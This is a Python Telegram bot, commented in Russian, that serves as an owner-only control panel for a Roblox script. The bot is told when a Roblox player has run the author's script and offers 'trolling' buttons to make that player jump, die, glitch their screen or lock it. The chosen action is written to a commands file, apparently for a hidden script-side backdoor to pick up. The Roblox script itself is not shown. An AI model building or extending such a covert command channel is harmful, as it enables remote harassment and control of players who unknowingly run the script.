import json
import os
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# === Настройки ===
CONFIG_FILE = "config.json"
COMMANDS_FILE = "commands.json"

with open(CONFIG_FILE, "r", encoding="utf-8") as f:
    cfg = json.load(f)

BOT_TOKEN = cfg["BOT_TOKEN"]
CREATOR_ID = cfg["CREATOR_ID"]

# Создание файла команд, если его нет
if not os.path.exists(COMMANDS_FILE):
    with open(COMMANDS_FILE, "w", encoding="utf-8") as f:
        json.dump({}, f, indent=2)

def update_command(username, command):
    with open(COMMANDS_FILE, "r", encoding="utf-8") as f:
        data = json.load(f)
    data[username] = command
    with open(COMMANDS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)

# === /start ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != CREATOR_ID:
        await update.message.reply_text("❌ У вас нет доступа.")
        return
    await update.message.reply_text("✅ Бот запущен!")

# === Функция уведомления о запуске скрипта Roblox ===
async def notify_usage(username):
    if CREATOR_ID:
        message = (
            f'Пользователь в Roblox с именем "`{username}`" использовал ваш скрипт.\n'
            f'Чтобы использовать на нём троллинг, введите:\n'
            f'/user "`{username}`"'
        )
        await app.bot.send_message(chat_id=CREATOR_ID, text=message, parse_mode="Markdown")

# === /user ===
async def user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != CREATOR_ID:
        await update.message.reply_text("❌ У вас нет доступа.")
        return
    if len(context.args) != 1:
        await update.message.reply_text("Использование: /user <RobloxName>")
        return

    username = context.args[0]

    buttons = [
        [InlineKeyboardButton("🟢 Jump", callback_data=f"jump:{username}")],
        [InlineKeyboardButton("💀 Kill", callback_data=f"kill:{username}")],
        [InlineKeyboardButton("⚡ Glitch Screen", callback_data=f"glitch:{username}")],
        [InlineKeyboardButton("🔒 Lock Screen", callback_data=f"lock:{username}")]
    ]
    keyboard = InlineKeyboardMarkup(buttons)
    await update.message.reply_text(f"🎮 Действия для {username}:", reply_markup=keyboard)

# === Обработка кнопок ===
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    command, username = query.data.split(":")
    update_command(username, command)
    await query.edit_message_text(f"Команда '{command}' отправлена {username}!")

# === Инициализация бота ===
app = ApplicationBuilder().token(BOT_TOKEN).build()

app.add_handler(CommandHandler("start", start))
app.add_handler(CommandHandler("user", user))
app.add_handler(CallbackQueryHandler(button))

print("Бот запущен...")
app.run_polling()